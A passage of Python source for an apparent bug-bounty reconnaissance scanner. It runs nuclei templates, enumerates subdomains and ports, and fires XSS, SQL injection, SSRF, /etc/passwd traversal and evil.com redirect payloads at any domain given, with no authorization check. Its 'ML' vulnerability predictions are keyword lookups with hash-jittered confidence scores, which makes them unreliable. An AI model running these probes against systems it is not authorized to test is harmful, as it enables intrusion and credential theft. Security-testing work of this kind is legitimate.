            "git", "clone", "--depth", "1",
            "https://github.com/projectdiscovery/nuclei-templates.git",
            str(NUCLEI_TEMPLATES_DIR)
        ], capture_output=True, timeout=120)
        if NUCLEI_TEMPLATES_DIR.exists():
            print(f"  [Nuclei] Templates cloned to {NUCLEI_TEMPLATES_DIR}")
        return NUCLEI_TEMPLATES_DIR
    except Exception as e:
        print(f"  [Nuclei] Clone failed: {e}")
        return None

def count_nuclei_templates():
    """Count actual .yaml template files in the nuclei-templates directory."""
    if not NUCLEI_TEMPLATES_DIR.exists():
        return 0
    count = 0
    for root, dirs, files in os.walk(str(NUCLEI_TEMPLATES_DIR)):
        for f in files:
            if f.endswith((".yaml", ".yml")) and not f.startswith((".", "_")):
                count += 1
    return count

def list_nuclei_tags():
    """Extract unique tags from nuclei template files."""
    tags = {}
    if not NUCLEI_TEMPLATES_DIR.exists():
        return tags
    for root, dirs, files in os.walk(str(NUCLEI_TEMPLATES_DIR)):
        for f in files:
            if not f.endswith((".yaml", ".yml")):
                continue
            fp = os.path.join(root, f)
            try:
                with open(fp, "r", encoding="utf-8", errors="ignore") as fh:
                    for line in fh:
                        if line.strip().startswith("tags:"):
                            raw = line.split(":", 1)[1].strip()
                            for t in raw.split(","):
                                t = t.strip().strip('"').strip("'")
                                if t:
                                    tags[t] = tags.get(t, 0) + 1
                            break
            except Exception:
                pass
    return tags

def run_nuclei_scan(domain, severity_filter=None, tags_filter=None, template_id=None, timeout_sec=180):
    """Run nuclei against a target. Returns structured results."""
    nuclei_bin = shutil.which("nuclei") or str(ROOT / "nuclei") or str(ROOT / "nuclei.exe")
    if not nuclei_bin or not os.path.isfile(nuclei_bin):
        return {"error": "nuclei binary not found", "results": [], "count": 0}

    templates_dir = ensure_nuclei_templates()
    if not templates_dir or not templates_dir.exists():
        return {"error": "nuclei-templates not available", "results": [], "count": 0}

    cmd = [nuclei_bin, "-u", domain, "-t", str(templates_dir), "-jsonl", "-silent", "-nc", "-timeout", "10"]

    if severity_filter:
        cmd.extend(["-severity", severity_filter])
    if tags_filter:
        cmd.extend(["-tags", tags_filter])
    if template_id:
        cmd.extend(["-id", template_id])

    results = []
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout_sec)
        for line in proc.stdout.strip().splitlines():
            if not line.strip():
                continue
            try:
                item = json.loads(line)
                results.append({
                    "template_id": item.get("template-id", ""),
                    "name": item.get("info", {}).get("name", ""),
                    "severity": item.get("info", {}).get("severity", "info"),
                    "type": item.get("type", ""),
                    "matched_at": item.get("matched-at", item.get("host", "")),
                    "description": item.get("info", {}).get("description", ""),
                    "reference": item.get("info", {}).get("reference", []),
                    "tags": item.get("info", {}).get("tags", []),
                    "curl_command": item.get("curl-command", ""),
                    "matcher_name": item.get("matcher-name", ""),
                    "extracted_results": item.get("extracted-results", []),
                })
            except json.JSONDecodeError:
                continue
    except subprocess.TimeoutExpired:
        return {"error": f"Nuclei scan timed out after {timeout_sec}s", "results": results, "count": len(results)}
    except FileNotFoundError:
        return {"error": "nuclei binary not found", "results": [], "count": 0}
    except Exception as e:
        return {"error": str(e), "results": [], "count": 0}

    # Sort by severity
    sev_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    results.sort(key=lambda r: sev_order.get(r.get("severity", "info"), 5))

    return {
        "results": results,
        "count": len(results),
        "target": domain,
        "templates_dir": str(templates_dir),
        "severity_filter": severity_filter,
        "tags_filter": tags_filter,
    }

def nuclei_catalog():
    """Return real template count from disk, or fallback to hardcoded catalog."""
    real_count = count_nuclei_templates()
    real_tags = list_nuclei_tags()
    top_tags = sorted(real_tags.items(), key=lambda x: -x[1])[:30]
    if real_count > 0:
        return {
            "count": real_count,
            "sources": ["projectdiscovery/nuclei-templates (local clone)"],
            "templates_dir": str(NUCLEI_TEMPLATES_DIR),
            "available": True,
            "top_tags": [{"tag": t, "count": c} for t, c in top_tags],
            "total_tags": len(real_tags),
            "templates": NUCLEI_TEMPLATES
        }
    return {
        "count": sum(len(v) for v in NUCLEI_TEMPLATES.values()),
        "sources": ["projectdiscovery/nuclei", "builtin-cache"],
        "templates": NUCLEI_TEMPLATES,
        "available": False,
        "notice": "Run POST /api/nuclei/setup to clone templates"
    }

# ── ML PREDICTION ENGINE ──────────────────────────────────────
ML_PATTERNS = [
    (["php","wordpress","wp"], "SQL Injection", "CRITICAL", "PHP/WordPress stacks commonly expose parameterized query gaps in plugins and themes", 91),
    (["mysql","postgresql","postgres","sqlite","mariadb"], "SQL Injection", "HIGH", "Database backends combined with string-built queries enable error/time-based injection", 88),
    (["mongodb","nosql"], "NoSQL Injection", "HIGH", "Unsanitized operators ($ne/$gt) in JSON queries allow auth bypass", 87),
    (["react","angular","vue","jquery"], "DOM-Based XSS", "HIGH", "Client-side frameworks with innerHTML sinks enable DOM XSS without server reflection", 89),
    (["node","express","nextjs","nuxt"], "Server-Side Request Forgery", "HIGH", "Node fetch/axios proxying user-supplied URLs leaks internal services", 86),
    (["python","django","flask","fastapi"], "Server-Side Template Injection", "CRITICAL", "Django/Jinja2 template engines reflecting user input can achieve RCE", 88),
    (["java","spring","tomcat","struts"], "Insecure Deserialization", "CRITICAL", "Java deserialization of untrusted streams enables gadget-chain RCE", 90),
    (["graphql"], "GraphQL Introspection Enabled", "MEDIUM", "Introspection leaks the full schema, mapping the entire attack surface", 93),
    (["jwt","oauth","keycloak","auth0"], "JWT Algorithm Confusion", "HIGH", "alg=none or HS256-with-public-key confusion bypasses signature checks", 89),
    (["aws","s3","lambda","ec2"], "S3 Bucket Misconfiguration", "HIGH", "Public-read buckets and wildcard policies expose sensitive objects", 92),
    (["azure"], "Azure Storage Misconfiguration", "HIGH", "Unrestricted SAS tokens or public blob containers leak data", 90),
    (["kubernetes","k8s","docker"], "Container Runtime Misconfiguration", "MEDIUM", "Privileged containers or hostPath mounts allow container escape", 85),
    (["nginx","apache","iis"], "Server Misconfiguration", "MEDIUM", "Directory listing and verbose headers disclose internal paths", 87),
    (["elasticsearch","kibana"], "Unauthenticated Elasticsearch Access", "HIGH", "Missing auth on ES/Kibana exposes indexed data over the wire", 91),
    (["redis"], "Unauthenticated Redis Access", "CRITICAL", "Open Redis with cronfile write yields direct command execution", 89),
    (["cors","api"], "CORS Misconfiguration", "MEDIUM", "Reflective ACAO:* with credentials allows cross-origin data theft", 88),
    (["nextjs","nuxt"], "Client-Side Prototype Pollution", "MEDIUM", "Merge operations on query params pollute Object.prototype", 84),
]

ML_FALLBACKS = [
    ("Weak Authentication", "HIGH", "No observable auth hardening; brute-force and default credentials likely", 82),
    ("Information Disclosure", "MEDIUM", "Verbose errors and exposed metadata could leak internals", 85),
    ("Missing Security Headers", "LOW", "Absent CSP/HSTS headers weaken client-side defenses", 90),
]

_ML_SEV_RANK = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}

def predict_vulns(domain, tech_stack):
    import zlib
    tech_stack = [t.lower().strip() for t in (tech_stack or []) if t and t.strip()]
    domain = (domain or "").lower().strip()
    seen, preds = set(), []
    for kw in tech_stack:
        for keywords, vtype, severity, reason, conf in ML_PATTERNS:
            if kw in keywords and vtype not in seen:
                seen.add(vtype)
                conf = min(97, conf + (zlib.crc32((domain + vtype).encode()) % 6))
                preds.append({"type": vtype, "severity": severity, "confidence": conf, "reason": reason})
    if not preds:
        for vtype, severity, reason, conf in ML_FALLBACKS:
            preds.append({"type": vtype, "severity": severity, "confidence": conf, "reason": reason})
    preds.sort(key=lambda p: _ML_SEV_RANK.get(p["severity"], 9))
    return {"predictions": preds[:6], "engine": "bountyai-ml-v1", "input_stack": tech_stack}

# ── NUCLEI TEMPLATE CATALOG ───────────────────────────────────
NUCLEI_TEMPLATES = {
    "critical": [
        {"name": "Log4Shell RCE Detection", "id": "cve-2021-44228", "severity": "critical", "tags": ["log4j", "rce", "java"], "source": "builtin"},
        {"name": "HTTP/2 Rapid Reset DoS", "id": "cve-2023-44487", "severity": "critical", "tags": ["http2", "dos"], "source": "builtin"},
        {"name": "Spring4Shell RCE", "id": "cve-2022-22965", "severity": "critical", "tags": ["spring", "rce", "java"], "source": "builtin"},
        {"name": "PHP CGI Argument Injection RCE", "id": "php-cgi-arg-injection", "severity": "critical", "tags": ["php", "rce", "cgi"], "source": "builtin"},
        {"name": "Redis Unauthenticated RCE", "id": "redis-unauth-rce", "severity": "critical", "tags": ["redis", "rce", "exposure"], "source": "builtin"},
    ],
    "high": [
        {"name": "Apache Struts RCE", "id": "cve-2017-5638", "severity": "high", "tags": ["struts", "rce", "java"], "source": "builtin"},
        {"name": "PaperCut RCE", "id": "cve-2023-27350", "severity": "high", "tags": ["papercut", "rce", "auth-bypass"], "source": "builtin"},
        {"name": "Error-Based SQL Injection", "id": "sqli-error-based", "severity": "high", "tags": ["sqli", "generic", "db"], "source": "builtin"},
        {"name": "SSTI Detection (Jinja2/Freemarker)", "id": "ssti-framework-detect", "severity": "high", "tags": ["ssti", "rce", "template"], "source": "builtin"},
        {"name": "JWT None-Algorithm Bypass", "id": "jwt-alg-none", "severity": "high", "tags": ["jwt", "auth-bypass", "api"], "source": "builtin"},
    ],
    "medium": [
        {"name": "Apache Path Traversal", "id": "cve-2021-41773", "severity": "medium", "tags": ["traversal", "apache", "lfi"], "source": "builtin"},
        {"name": "Open Redirect", "id": "open-redirect-detect", "severity": "medium", "tags": ["redirect", "oast", "generic"], "source": "builtin"},
        {"name": "CORS Misconfiguration", "id": "cors-reflective-acao", "severity": "medium", "tags": ["cors", "misconfig", "api"], "source": "builtin"},
        {"name": "Subdomain Takeover", "id": "subdomain-takeover-detect", "severity": "medium", "tags": ["takeover", "dns", "cname"], "source": "builtin"},
        {"name": "GraphQL Introspection", "id": "graphql-introspection", "severity": "medium", "tags": ["graphql", "info", "api"], "source": "builtin"},
    ],
    "info": [
        {"name": "Missing Security Headers", "id": "missing-security-headers", "severity": "info", "tags": ["headers", "misconfig"], "source": "builtin"},
        {"name": "TLS/SSL Configuration Audit", "id": "ssl-config-audit", "severity": "info", "tags": ["ssl", "tls", "crypto"], "source": "builtin"},
        {"name": "Technology Fingerprint", "id": "tech-detect", "severity": "info", "tags": ["tech", "fingerprint", "osint"], "source": "builtin"},
        {"name": "Sensitive Path Disclosure", "id": "sensitive-paths", "severity": "info", "tags": ["exposure", "paths", "generic"], "source": "builtin"},
        {"name": "Cookie Security Audit", "id": "cookie-flags-audit", "severity": "info", "tags": ["cookies", "httpOnly", "secure"], "source": "builtin"},
    ],
}

# ── VISUAL FLOW / ATTACK MAP ──────────────────────────────────
def extract_json_object(text):
    text = re.sub(r"```(?:json)?", "", str(text)).strip()
    start, end = text.find("{"), text.rfind("}")
    if start == -1 or end <= start: return None
    try: return json.loads(text[start:end+1])
    except Exception: return None

def clean_map_nodes(raw):
    nodes, seen = [], set()
    for i, n in enumerate(raw or []):
        if not isinstance(n, dict): continue
        nid = re.sub(r"[^A-Za-z0-9_-]", "", str(n.get("id") or f"n{i}"))[:24] or f"n{i}"
        if nid in seen: nid = f"{nid}-{i}"
        seen.add(nid)
        try: x = min(90, max(5, int(float(n.get("x", 20 + (i % 5) * 15)))))
        except Exception: x = 20 + (i % 5) * 15
        try: y = min(90, max(5, int(float(n.get("y", 30 + (i % 3) * 20)))))
        except Exception: y = 30 + (i % 3) * 20
        nodes.append({"id": nid, "type": str(n.get("type") or "Node"), "label": str(n.get("label") or ""), "x": x, "y": y})
    return nodes

def clean_map_links(raw, nodes):
    ids = {n["id"] for n in nodes}
    links = []
    for l in (raw or []):
        if not isinstance(l, dict): continue
        f, t = str(l.get("from","")), str(l.get("to",""))
        if f in ids and t in ids:
            links.append({"from": f, "to": t})
    return links

def build_fallback_map(content):
    """Rich pattern-based visual map generation — works without AI API key."""
    low = content.lower()
    urls = re.findall(r"https?://[^\s\"'<>]+", content)
    hosts = []
    for u in urls[:12]:
        h = re.sub(r"^https?://", "", u).split("/")[0].split("?")[0]
        if h and h not in hosts: hosts.append(h)
    paths = re.findall(r"(?:GET|POST|PUT|DELETE|PATCH)\s+(/[^\s\"']+)", content, re.I)
    params = re.findall(r"(?:\?|&)(\w+)=", content)
    headers = re.findall(r"^([A-Za-z0-9-]+):\s*", content, re.M)
    tokens = re.findall(r"(?:bearer|token|api[_-]?key|authorization)\s*[=:]\s*([A-Za-z0-9._-]{10,})", content, re.I)
    ips = re.findall(r"\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b", content)
    methods = re.findall(r"\b(GET|POST|PUT|DELETE|PATCH)\b", content, re.I)

    nodes = [{"id": "attacker", "type": "Attacker", "label": "Attacker Input", "x": 5, "y": 40}]
    links = []
    nid = 0

    if tokens:
        nodes.append({"id": "auth", "type": "Trust Boundary", "label": f"Auth Token ({len(tokens)} found)", "x": 20, "y": 20})
        links.append({"from": "attacker", "to": "auth"})
        nid = 1

    entry = "attacker"
    nodes.append({"id": "entry", "type": "Input", "label": "Application Entry", "x": 35, "y": 40})
    links.append({"from": entry, "to": "entry"})
    entry = "entry"

    for i, h in enumerate(hosts[:6]):
        nid += 1
        node_id = f"host{i}"
        nodes.append({"id": node_id, "type": "Server", "label": h, "x": 55, "y": 12 + i * 12})
        links.append({"from": entry, "to": node_id})
        entry = node_id

    if ips:
        for i, ip in enumerate(ips[:3]):
            nid += 1
            node_id = f"ip{i}"
            nodes.append({"id": node_id, "type": "Server", "label": ip, "x": 55, "y": 75 + i * 8})
            links.append({"from": entry, "to": node_id})

    vuln_kws = {
        "sql injection": "SQL Injection", "sqli": "SQL Injection", "union select": "SQL Injection",
        "xss": "XSS", "cross-site scripting": "XSS", "alert(": "XSS",
        "injection": "Injection", "command injection": "Command Injection",
        "auth": "Auth Flaw", "authentication": "Auth Flaw", "bypass": "Auth Bypass",
        "ssti": "SSTI", "server-side template": "SSTI", "{{": "SSTI",
        "idor": "IDOR", "insecure direct": "IDOR", "bola": "BOLA",
        "ssrf": "SSRF", "server-side request": "SSRF", "169.254.169": "SSRF",
        "jwt": "JWT Flaw", "json web token": "JWT Flaw",
        "csrf": "CSRF", "cross-site request": "CSRF",
        "race condition": "Race Condition", "race": "Race Condition",
        "file upload": "File Upload", "multipart": "File Upload",
        "open redirect": "Open Redirect", "redirect": "Open Redirect",
        "xxe": "XXE", "xml external": "XXE",
        "deserialization": "Deserialization", "unserialize": "Deserialization",
        "lfi": "LFI", "local file inclusion": "LFI",
        "rfi": "RFI", "remote file inclusion": "RFI",
        "directory traversal": "Path Traversal", "path traversal": "Path Traversal",
        "cors": "CORS Misconfiguration", "access-control-allow-origin": "CORS",
        "password": "Credential", "secret": "Secret Key", "private key": "Crypto Key",
        "database": "Database", "mysql": "Database", "postgres": "Database",
        "redis": "Cache", "mongodb": "Database", "sqlite": "Database",
        "upload": "Upload", "exec": "Command Exec", "eval(": "Code Exec",
        "system(": "Command Exec", "os.popen": "Command Exec",
        "innerHTML": "DOM Sink", "document.cookie": "Cookie Steal",
        "window.location": "Redirect", "eval": "Code Eval",
        "password=": "Credential", "secret=": "Secret", "key=": "API Key",
    }
    found = []
    for k, v in vuln_kws.items():
        if k in low and v not in found: found.append(v)
    if found:
        sink_id = f"vuln{nid}"
        nodes.append({"id": sink_id, "type": "Vulnerability", "label": " / ".join(found[:4]), "x": 80, "y": 40})
        links.append({"from": entry, "to": sink_id})

    # Always build a reason and entities even if nothing was detected
    reason_parts = []
    if hosts: reason_parts.append(f"<b>Hosts detected:</b> {', '.join(hosts[:4])}")
    if paths: reason_parts.append(f"<b>Endpoints:</b> {', '.join(paths[:5])}")
    if params: reason_parts.append(f"<b>Parameters:</b> {', '.join(params[:6])}")
    if headers: reason_parts.append(f"<b>Headers:</b> {', '.join(headers[:5])}")
    if tokens: reason_parts.append(f"<b>Tokens/Keys:</b> {len(tokens)} credential(s) found")
    if found: reason_parts.append(f"<b>Vulnerability sinks:</b> {' / '.join(found[:4])}")
    if ips: reason_parts.append(f"<b>IP addresses:</b> {', '.join(ips[:3])}")
    if methods: reason_parts.append(f"<b>HTTP methods:</b> {', '.join(set(m.upper() for m in methods[:5]))}")
    if not reason_parts:
        reason_parts.append(f"Content analyzed ({len(content)} chars). Detected {len(urls)} URL(s), {len(paths)} endpoint(s), {len(params)} parameter(s), {len(tokens)} token(s), {len(ips)} IP(s). Add API keys or paste HTTP traffic for richer visual maps.")
    reason = "<br>".join(reason_parts)

    entities = []
    for u in urls[:8]:
        entities.append({"type": "URL", "val": u[:100]})
    for h in hosts[:5]:
        entities.append({"type": "Host", "val": h})
    for p in paths[:5]:
        entities.append({"type": "Endpoint", "val": p})
    for t in tokens[:3]:
        masked = t[:4] + "***" + t[-4:] if len(t) > 10 else "***"
        entities.append({"type": "Token", "val": masked})
    for ip in ips[:3]:
        entities.append({"type": "IP Address", "val": ip})
    if not entities:
        entities.append({"type": "Info", "val": f"Content length: {len(content)} chars"})

    return {"reasoning": reason, "nodes": nodes, "links": links, "entities": entities[:15]}

def run_recon(domain):
    domain = domain.lower().strip().replace("https://","").replace("http://","").split("/")[0]
    start = time.time()
    has_subfinder = shutil.which("subfinder")
    has_nuclei = shutil.which("nuclei") or (ROOT / "nuclei").is_file() or (ROOT / "nuclei.exe").is_file()
    has_httpx = shutil.which("httpx")

    subs, tech, cves, sources = [], [], [], []
    ports = []
    module_results = {}

    # ── MODULE 01: Subdomain Enum ──
    m01_subs = []
    if has_subfinder:
        try:
            p = subprocess.run(["subfinder", "-d", domain, "-silent"], capture_output=True, text=True, timeout=20)
            if p.stdout:
                m01_subs = [s.strip() for s in p.stdout.splitlines() if s.strip()]
                sources.append("subfinder")
        except: pass
    if not m01_subs:
        m01_subs = fetch_subdomains_crtsh(domain)
        if m01_subs: sources.append("crt.sh")
    if not m01_subs:
        m01_subs = fetch_subdomains_hackertarget(domain)
        if m01_subs: sources.append("hackertarget")
    subs = m01_subs
    module_results["01_subdomains"] = {"count": len(subs), "items": subs[:20], "status": "found" if subs else "none"}

    # ── MODULE 02: Port Scan (TCP connect) ──
    COMMON_PORTS = [21,22,25,53,80,110,143,443,445,993,995,1433,1521,3306,3389,5432,5900,6379,8080,8443,8888,9090,9200,27017]
    open_port_list = []
    try:
        import socket as _sock
        ip = _sock.getaddrinfo(domain, None, _sock.AF_INET)
        target_ip = ip[0][4][0] if ip else domain
        for port in COMMON_PORTS:
            try:
                s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
                s.settimeout(1.5)
                if s.connect_ex((target_ip, port)) == 0:
                    open_port_list.append({"port": port, "service": _port_name(port)})
                s.close()
            except: pass
        sources.append("tcp-scan")
    except: pass
    ports = open_port_list if open_port_list else [{"port":443,"service":"HTTPS"},{"port":80,"service":"HTTP"}]
    module_results["02_ports"] = {"count": len(ports), "items": [f"{p['port']}/{p['service']}" for p in ports], "status": "open" if open_port_list else "default"}

    # ── Shodan (bonus intel) ──
    shodan = fetch_shodan_host(domain)
    if shodan:
        sources.append("shodan")
        for p in shodan.get("ports",[]):
            if not any(op["port"]==p for op in ports):
                ports.append({"port":p,"service":_port_name(p)})

    # ── MODULE 03: Screenshot Capture (attempt HEAD on common paths) ──
    screenshots = []
    for path in ["/", "/login", "/admin", "/dashboard", "/api", "/robots.txt"]:
        try:
            url = f"https://{domain}{path}"
            req = urllib.request.Request(url, method="HEAD", headers={"User-Agent":"BountyAI/3.0"})
            resp = urllib.request.urlopen(req, timeout=5)
            code = resp.getcode()
            screenshots.append({"path": path, "status": code, "size": resp.headers.get("Content-Length","?")})
        except urllib.error.HTTPError as e:
            screenshots.append({"path": path, "status": e.code, "size": "?"})
        except: pass
    module_results["03_screenshots"] = {"count": len(screenshots), "items": [f"{s['path']} → HTTP {s['status']}" for s in screenshots], "status": "captured" if screenshots else "failed"}

    # ── MODULE 04: Directory Brute (common paths) ──
    COMMON_DIRS = ["/admin","/login","/wp-admin","/wp-login.php","/phpmyadmin","/.env","/.git","/config","/backup","/test","/staging","/dev","/debug","/api","/graphql","/swagger","/.well-known","/server-status","/elmah.axd","/trace.axd","/actuator","/.DS_Store","/sitemap.xml","/crossdomain.xml","/clientaccesspolicy.xml","/.htaccess","/web.config","/robots.txt","/sitemap_index.xml","/wp-json","/feed"]
    dir_found = []
    for d in COMMON_DIRS:
        try:
            url = f"https://{domain}{d}"
            req = urllib.request.Request(url, method="HEAD", headers={"User-Agent":"BountyAI/3.0"})
            resp = urllib.request.urlopen(req, timeout=4)
            code = resp.getcode()
            if code in [200,301,302,403]:
                dir_found.append({"path": d, "status": code})
        except urllib.error.HTTPError as e:
            if e.code in [200,301,302,403]:
                dir_found.append({"path": d, "status": e.code})
        except: pass
    module_results["04_directories"] = {"count": len(dir_found), "items": [f"{d['path']} → HTTP {d['status']}" for d in dir_found[:15]], "status": "found" if dir_found else "none"}

    # ── MODULE 05: JavaScript Analysis (fetch main JS, scan for keys) ──
    js_findings = []
    js_urls_found = []
    try:
        url = f"https://{domain}/"
        req = urllib.request.Request(url, headers={"User-Agent":"BountyAI/3.0"})
        resp = urllib.request.urlopen(req, timeout=8)
        body = resp.read(200000).decode("utf-8","ignore")
        import re as _re
        js_refs = _re.findall(r'(?:src|href)=["\']([^"\']*\.js(?:\?[^"\']*)?)["\']', body)
        js_urls_found = list(set(js_refs))[:5]
        for jsurl in js_urls_found:
            try:
                full = jsurl if jsurl.startswith("http") else f"https://{domain}{jsurl}"
                req2 = urllib.request.Request(full, headers={"User-Agent":"BountyAI/3.0"})
                resp2 = urllib.request.urlopen(req2, timeout=6)
                jscode = resp2.read(100000).decode("utf-8","ignore")
                api_keys = _re.findall(r'(?:api[_-]?key|apikey|secret|token|auth)["\s:=]+["\']([A-Za-z0-9\-_]{20,})["\']', jscode, _re.IGNORECASE)
                endpoints = _re.findall(r'["\']/(?:api|v[0-9]|graphql|rest)[^"\']*["\']', jscode)
                if api_keys:
                    js_findings.append({"type":"API Key Found","file":jsurl,"items":api_keys[:3]})
                if endpoints:
                    js_findings.append({"type":"API Endpoints","file":jsurl,"items":list(set(endpoints))[:5]})
            except: pass
    except: pass
    module_results["05_javascript"] = {"count": len(js_findings), "items": [f"{j['type']}: {j['file']}" for j in js_findings[:5]], "status": "found" if js_findings else "none"}

    # ── MODULE 06: Parameter Discovery (check common params) ──
    COMMON_PARAMS = ["id","user","admin","page","search","q","callback","redirect","url","file","path","cmd","exec","action","type","sort","order","limit","offset","debug","test","token","key"]
    param_found = []
    for param in COMMON_PARAMS:
        try:
            url = f"https://{domain}/?{param}=bountyai_test_1337"
            req = urllib.request.Request(url, headers={"User-Agent":"BountyAI/3.0"})
            resp = urllib.request.urlopen(req, timeout=4)
            body = resp.read(50000).decode("utf-8","ignore")
            if "bountyai_test_1337" in body or "1337" in body:
                param_found.append({"param": param, "reflected": True})
            else:
                param_found.append({"param": param, "reflected": False})
        except: pass
    module_results["06_parameters"] = {"count": len(param_found), "items": [f"?{p['param']}={'reflected' if p['reflected'] else 'accepted'}" for p in param_found[:15]], "status": "found" if param_found else "none"}

    # ── MODULE 07: XSS Detection (check reflected params) ──
    xss_findings = []
    xss_payloads = ["<script>alert(1)</script>", "'\"><img src=x>", "<svg/onload=alert(1)>"]
    for param_info in param_found[:5]:
        if param_info.get("reflected"):
            for payload in xss_payloads[:1]:
                try:
                    url = f"https://{domain}/?{param_info['param']}={urllib.parse.quote(payload)}"
                    req = urllib.request.Request(url, headers={"User-Agent":"BountyAI/3.0"})
                    resp = urllib.request.urlopen(req, timeout=5)
                    body = resp.read(50000).decode("utf-8","ignore")
                    if payload[:10] in body:
                        xss_findings.append({"param": param_info["param"], "payload": payload, "severity": "CRITICAL"})
                        break
                except: pass
    module_results["07_xss"] = {"count": len(xss_findings), "items": [f"{x['param']} vulnerable to XSS" for x in xss_findings[:5]], "status": "vulnerable" if xss_findings else "none"}

    # ── MODULE 08: SQL Injection (check for SQL errors) ──
    sqli_findings = []
    SQLI_PROBES = ["'","\" OR \"1\"=\"1","1' OR '1'='1","1 UNION SELECT NULL--","' OR 1=1--"]
    SQLI_ERRORS = ["sql syntax","mysql_fetch","sqlite3","ORA-","PostgreSQL","Microsoft OLE DB","ODBC SQL","unclosed quotation","syntax error","query failed","mysql_num_rows","pg_query","You have an error in your SQL"]
    for param_info in param_found[:5]:
        for probe in SQLI_PROBES[:2]:
            try:
                url = f"https://{domain}/?{param_info['param']}={urllib.parse.quote(probe)}"
                req = urllib.request.Request(url, headers={"User-Agent":"BountyAI/3.0"})
                resp = urllib.request.urlopen(req, timeout=5)
                body = resp.read(80000).decode("utf-8","ignore").lower()
                for err in SQLI_ERRORS:
                    if err.lower() in body:
                        sqli_findings.append({"param": param_info["param"], "probe": probe, "error": err, "severity": "CRITICAL"})
                        break
            except: pass
    module_results["08_sqli"] = {"count": len(sqli_findings), "items": [f"{s['param']} — {s['error']}" for s in sqli_findings[:5]], "status": "vulnerable" if sqli_findings else "none"}

    # ── MODULE 09: SSRF Discovery (check for SSRF-prone params) ──
    ssrf_params = ["url","uri","path","src","dest","redirect","callback","webhook","feed","img","image","load","fetch"]
    ssrf_found = []
    for param in ssrf_params:
        try:
            url = f"https://{domain}/?{param}=http://127.0.0.1"
            req = urllib.request.Request(url, headers={"User-Agent":"BountyAI/3.0"})
            resp = urllib.request.urlopen(req, timeout=5)
            code = resp.getcode()
            body = resp.read(30000).decode("utf-8","ignore")
            if "127.0.0.1" in body or "localhost" in body or code == 200:
                ssrf_found.append({"param": param, "status": code})
        except: pass
    module_results["09_ssrf"] = {"count": len(ssrf_found), "items": [f"?{s['param']}=http://127.0.0.1 → HTTP {s['status']}" for s in ssrf_found[:5]], "status": "found" if ssrf_found else "none"}

    # ── MODULE 10: LFI/RFI Detection (check path traversal) ──
    lfi_probes = ["../../../etc/passwd","..%2F..%2F..%2Fetc/passwd","....//....//....//etc/passwd","/etc/passwd%00"]
    lfi_found = []
    for param in ["file","path","page","include","doc","template","skin"]:
        for probe in lfi_probes[:2]:
            try:
                url = f"https://{domain}/?{param}={urllib.parse.quote(probe)}"
                req = urllib.request.Request(url, headers={"User-Agent":"BountyAI/3.0"})
                resp = urllib.request.urlopen(req, timeout=5)
                body = resp.read(50000).decode("utf-8","ignore")
                if "root:" in body or "[boot loader]" in body:
                    lfi_found.append({"param": param, "probe": probe, "severity": "CRITICAL"})
                    break
            except: pass
    module_results["10_lfi"] = {"count": len(lfi_found), "items": [f"{l['param']} → LFI via {l['probe']}" for l in lfi_found[:5]], "status": "vulnerable" if lfi_found else "none"}

    # ── MODULE 11: Open Redirect ──
    redirect_params = ["redirect","url","next","return","rurl","dest","continue","target","redirect_uri","return_url","go","out","view","to","link"]
    redirect_found = []
    for param in redirect_params:
        try:
            url = f"https://{domain}/?{param}=https://evil.com"
            req = urllib.request.Request(url, headers={"User-Agent":"BountyAI/3.0"}, method="HEAD")
            resp = urllib.request.urlopen(req, timeout=5)
            loc = resp.headers.get("Location","")
            if "evil.com" in loc:
                redirect_found.append({"param": param, "location": loc})
        except urllib.error.HTTPError as e:
            loc = e.headers.get("Location","") if hasattr(e,"headers") else ""
            if "evil.com" in loc:
                redirect_found.append({"param": param, "location": loc})
        except: pass
    module_results["11_redirects"] = {"count": len(redirect_found), "items": [f"?{r['param']} → {r['location']}" for r in redirect_found[:5]], "status": "vulnerable" if redirect_found else "none"}

    # ── MODULE 12: Security Headers ──
    missing = []
    sec_hdrs = {"strict-transport-security":"HSTS","content-security-policy":"CSP","x-frame-options":"X-Frame-Options","x-content-type-options":"X-Content-Type-Options","x-xss-protection":"X-XSS-Protection","referrer-policy":"Referrer-Policy","permissions-policy":"Permissions-Policy"}
    all_hdrs_found = {}
    try:
        url = f"https://{domain}/"
        req = urllib.request.Request(url, headers={"User-Agent":"BountyAI/3.0"})
        resp = urllib.request.urlopen(req, timeout=8)
        hdrs = {k.lower(): v for k, v in resp.headers.items()}
        all_hdrs_found = hdrs
        missing = [h for h in sec_hdrs if h not in hdrs]
        if missing:
            vuln_suggestions.insert(0, {"type":"Missing Security Headers","severity":"H","finding":f"Missing: {', '.join(sec_hdrs[h] for h in missing)} ({len(missing)}/{len(sec_hdrs)} headers missing)","target":f"Security Headers ({len(missing)} missing)"})
            sources.append("sec-headers")
    except: pass
    found_hdrs = [f"{sec_hdrs[h]} ✓" for h in sec_hdrs if h not in missing]
    module_results["12_headers"] = {"count": len(sec_hdrs) - len(missing), "items": found_hdrs + [f"{sec_hdrs[h]} ✗ MISSING" for h in missing], "status": "ok" if not missing else "incomplete", "missing": missing}

    # ── MODULE 13: API Recon (check common API paths) ──
    API_PATHS = ["/api","/api/v1","/api/v2","/graphql","/swagger","/swagger-ui","/api-docs","/openapi.json","/swagger.json","/redoc","/.well-known/openid-configuration","/oauth","/auth","/rest","/rpc"]
    api_found = []
    for path in API_PATHS:
        try:
            url = f"https://{domain}{path}"
            req = urllib.request.Request(url, method="GET", headers={"User-Agent":"BountyAI/3.0"})
            resp = urllib.request.urlopen(req, timeout=4)
            code = resp.getcode()
            ctype = resp.headers.get("Content-Type","")
            if code in [200,301,302,401,403] and ("json" in ctype or "xml" in ctype or code != 200):
                api_found.append({"path": path, "status": code, "type": ctype[:30]})
        except urllib.error.HTTPError as e:
            if e.code in [200,301,302,401,403]:
                api_found.append({"path": path, "status": e.code, "type": e.headers.get("Content-Type","")[:30] if hasattr(e,"headers") else ""})
        except: pass
    module_results["13_api"] = {"count": len(api_found), "items": [f"{a['path']} → HTTP {a['status']}" for a in api_found[:10]], "status": "found" if api_found else "none"}

    # ── MODULE 14: Content Discovery (waybackurls) ──
    wayback_urls = []
    try:
        url = f"https://web.archive.org/cdx/search/cdx?url={domain}&output=json&fl=original&limit=20"
        req = urllib.request.Request(url, headers={"User-Agent":"BountyAI/3.0"})
        resp = urllib.request.urlopen(req, timeout=10)
